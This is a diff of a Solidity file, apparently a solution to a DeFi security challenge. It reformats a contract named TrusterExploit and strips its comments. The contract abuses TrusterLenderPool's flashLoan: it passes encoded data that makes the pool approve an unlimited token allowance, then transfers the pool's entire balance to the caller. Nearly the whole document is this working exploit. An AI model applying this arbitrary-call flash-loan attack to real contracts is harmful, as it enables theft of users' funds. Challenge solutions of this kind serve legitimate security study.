@@ -34,24 +34,16 @@ contract TrusterLenderPool is ReentrancyGuard {
 }
 
 contract TrusterExploit {
-    function attack (
-        address _pool,
-        address dvt
-        )
-        public
-    {
-        //instantiate the pool and token at the given addresses
+    function attack ( address _pool, address _token) public {
         TrusterLenderPool pool = TrusterLenderPool(_pool);
-        IERC20 token = IERC20(dvt);
+        IERC20 token = IERC20(_token);
 
-        //encode the call to approve the allowance for this contract
-        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), uint(-1));
+        bytes memory data = abi.encodeWithSignature(
+            "approve(address,uint256)", address(this), uint(-1)
+        );
 
-        //we don't want to loan anything, we just want to approve an allowance on the token in the context of the pool
-        pool.flashLoan(0, msg.sender, dvt, data);
+        pool.flashLoan(0, msg.sender, _token, data);
 
-        //use the allowance to transfer the tokens from the pool to the attacker
         token.transferFrom(_pool , msg.sender, token.balanceOf(_pool));
-
     }
 }
